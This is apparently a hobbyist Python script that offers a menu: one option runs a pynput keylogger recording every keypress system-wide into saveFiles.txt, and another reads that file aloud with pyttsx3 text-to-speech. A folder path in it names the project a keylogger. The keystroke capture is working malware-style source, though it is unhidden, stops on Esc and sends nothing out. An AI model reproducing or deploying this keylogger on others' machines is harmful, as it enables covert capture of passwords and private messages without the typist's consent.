import pyttsx3
from pynput.keyboard import Listener;
ch=input("Enter the Choice\n k.Keyboard reading(press Esc to Exit) \n r. Read the file \n e.Exit\n")
match ch:
            case 'k':
                #from pynput.keyboard import Listener;
                def write_to_file(k):
                    word = str(k)
                    word = word.replace("'", "")
                    if word == 'Key.space':
                        word = ' '
                    if word == 'Key.backspace':
                        word = ''
                    if word == 'Key.shift_r':
                        word = ''
                    if word == 'Key.shift':
                        word = ''
                    if word == "Key.ctrl_l":
                        word = ""
                    if word == "Key.enter":
                        word = "\n"
                    if word == "key.rightkey":
                        word = ""
                    if word == "Key.esc":
                        word =""
                        exit(0);
                    with open("saveFiles.txt", 'a') as f:
                        f.write(word)
    
                    # Collecting events until stopped
                with Listener(on_press=write_to_file) as l:
                       l.join()
 
      
            case 'r':
                    myfile=open(r'C:\Users\ankit\OneDrive\Desktop\ide se keylogger\saveFiles.txt')
                    txt=myfile.read()
                    class TextToSpeech:
                        engine: pyttsx3.Engine
    
                        def __init__(self, voice, rate: int, volume: float):
                            self.engine = pyttsx3.init()
                            if voice:
                                self.engine.setProperty('voice', voice)
                            self.engine.setProperty('rate', rate)
                            self.engine.setProperty('volume', volume)  # Between 0 and 1
                        def text_to_speech(self, text: str, save: bool = False, file_name='output.mp3'):
                            self.engine.say(text)
                            print('I\'m speaking...')
    
                            if save:
                                # On linux make sure that 'espeak' and 'ffmpeg' are installed
                                self.engine.save_to_file(text, file_name)
    
                            self.engine.runAndWait()
    
                        def list_available_voices(self):
                            voices: list = [self.engine.getProperty('voices')]
    
                            for i, voice in enumerate(voices[0]):
                                print(f'({i + 1}) {voice.name} {voice.age}: {voice.languages[0]} ({voice.gender}) [ID: {voice.id}]')
                    if __name__ == '__main__':
                        tts = TextToSpeech('com.apple.speech.synthesis.voice.daniel', 200, 1.0)
            # tts.list_available_voices()
                        tts.text_to_speech(txt, save=True, file_name='output.mp3')
            case 'e':
                    exit(0);
